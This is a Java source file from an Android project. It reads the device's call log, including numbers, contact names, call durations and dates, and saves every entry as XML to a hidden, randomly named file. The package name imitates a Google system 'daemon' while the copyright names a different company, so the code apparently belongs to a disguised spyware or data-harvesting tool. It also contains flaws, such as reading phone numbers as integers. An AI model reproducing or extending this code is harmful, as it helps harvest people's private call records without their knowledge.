/**
 * @(#) CallLogCollect.java Created on 2013-1-20
 *
 * Copyright (c) 2013 com.braver. All Rights Reserved
 */
package com.google.android.daemon.collect;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.UUID;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog.Calls;

import com.google.android.daemon.DateTimeUtil;
import com.google.android.daemon.Log;
import com.google.android.daemon.Util;
import com.google.android.daemon.collect.read.ProviderReader;

/**
 * The class <code>CallLogCollect</code>
 * 
 * @author ouyangfeng
 * @version 1.0
 */
public class CallLogCollect implements ObjectCollect {

    protected Context mContext;

    protected CallLogReader reader;

    public CallLogCollect(Context mContext) {
        this.mContext = mContext;
        reader = new CallLogReader(mContext);
    }

    /**
     * (non-Javadoc)
     * 
     * @see com.google.android.daemon.collect.ObjectCollect#collect()
     */
    @Override
    public String collect() {
        return read();
    }

    protected String read() {
        return execute();
    }

    /**
     * return save path,is not success return null
     * 
     * @return
     */
    private String execute() {
        final StringBuffer buffer = reader.read();

        final String path = mContext.getFilesDir().getAbsolutePath() + File.separator + UUID.randomUUID();
        final File file = new File(path);
        try {
            final BufferedWriter writer = new BufferedWriter(new FileWriter(file));
            writer.append(buffer);
            writer.flush();
            writer.close();
            return path;
        } catch (IOException e) {
            Log.e("", e);
        }
        return null;
    }

    private final class CallLogReader extends ProviderReader {

        /**
         * Constructor
         * 
         * @param mContext
         */
        private CallLogReader(Context mContext) {
            super(mContext);
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderReader#readRow(int[], android.database.Cursor)
         */
        @Override
        protected String readRow(int[] columnIndexs, Cursor cur) {
            final int id = cur.getInt(columnIndexs[0]);
            final int type = cur.getInt(columnIndexs[1]);
            final int number = cur.getInt(columnIndexs[2]);
            final int duration = cur.getInt(columnIndexs[3]);
            final int snew = cur.getInt(columnIndexs[4]);
            final String name = cur.getString(columnIndexs[5]);
            final int numbertype = cur.getInt(columnIndexs[6]);
            final String numberlabel = cur.getString(columnIndexs[7]);
            final long date = cur.getLong(columnIndexs[8]);

            return smsBuilder(id, type, number, duration, snew, name, numbertype, numberlabel, date);
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderReader#getProjection()
         */
        @Override
        protected String[] getProjection() {
            return new String[] { "_id", "type", "number", "duration", "new", "name", "numbertype", "numberlabel",
                    "date" };
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderReader#getUri()
         */
        @Override
        protected Uri getUri() {
            return Calls.CONTENT_URI;
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderReader#getRootTag()
         */
        @Override
        protected String getRootTag() {
            return "CallLog";
        }

        /**
         * builder one log
         * 
         * @param id
         * @param type
         * @param number
         * @param duration
         * @param snew
         * @param name
         * @param numbertype
         * @param numberlabel
         * @param date
         * @return
         */
        private String smsBuilder(int id, int type, int number, int duration, int snew, String name, int numbertype,
                String numberlabel, long date) {

            final StringBuffer buffer = new StringBuffer();
            buffer.append(Util.builderXmlOneTAG("LOG", false, false, true));

            buffer.append(Util.builderXmlTAG("id", "" + id, true));
            buffer.append(Util.builderXmlTAG("type", Util.getCallLogType(type), true));
            buffer.append(Util.builderXmlTAG("number", "" + number, true));
            buffer.append(Util.builderXmlTAG("duration", "" + duration, true));
            buffer.append(Util.builderXmlTAG("snew", "" + snew, true));
            buffer.append(Util.builderXmlTAG("name", name, true));
            buffer.append(Util.builderXmlTAG("numbertype", "" + numbertype, true));
            buffer.append(Util.builderXmlTAG("numberlabel", numberlabel, true));
            buffer.append(Util.builderXmlTAG("date", DateTimeUtil.toText2(date), true));

            buffer.append(Util.builderXmlOneTAG("LOG", false, true, true));
            return buffer.toString();
        }


    }

}
